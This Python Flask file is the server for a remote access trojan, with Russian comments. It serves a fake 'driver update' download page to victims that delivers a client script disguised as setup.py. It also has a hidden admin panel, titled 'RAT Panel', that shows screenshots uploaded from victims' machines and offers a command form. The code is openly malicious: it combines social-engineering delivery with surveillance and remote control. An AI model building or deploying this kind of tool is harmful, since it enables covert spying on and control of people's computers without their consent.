from flask import Flask, render_template_string, request, send_file
import os

app = Flask(__name__)

# Тут храним скриншот последнего клиента
latest_screenshot = None

HTML_ADMIN = """
<!DOCTYPE html>
<html>
<head><title>RAT Panel</title></head>
<body style="background:#111; color:white; text-align:center; font-family:Arial;">
    <h1>Панель управления</h1>
    <img src="/get_screen" style="width:80%; border:2px solid red; margin-top:20px;">
    <br><br>
    <form action="/cmd" method="POST">
        <input type="text" name="command" placeholder="Введи команду..." style="padding:10px; width:300px;">
        <button type="submit" style="padding:10px;">Отправить</button>
    </form>
</body>
</html>
"""

HTML_VICTIM = """
<!DOCTYPE html>
<html>
<head><title>Обновление драйверов</title></head>
<body style="background:#1e1e1e; color:white; text-align:center; padding-top:50px; font-family:Arial;">
    <h1>Скачайте установщик</h1>
    <a href="/download" style="padding:15px 30px; font-size:20px; background:#007bff; color:white; text-decoration:none; border-radius:5px;">Скачать</a>
</body>
</html>
"""

@app.route('/')
def index():
    # Проверяем, админ это или жертва (по секретному параметру)
    if request.args.get('admin') == 'true':
        return render_template_string(HTML_ADMIN)
    return render_template_string(HTML_VICTIM)

@app.route('/get_screen')
def get_screen():
    global latest_screenshot
    if latest_screenshot:
        return send_file(latest_screenshot, mimetype='image/jpeg')
    return "Нет данных"

@app.route('/upload_screen', methods=['POST'])
def upload_screen():
    global latest_screenshot
    file = request.files['file']
    file.save('screen.jpg')
    latest_screenshot = 'screen.jpg'
    return "OK"

@app.route('/download')
def download():
    return send_file('client.py', as_attachment=True, download_name='setup.py')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
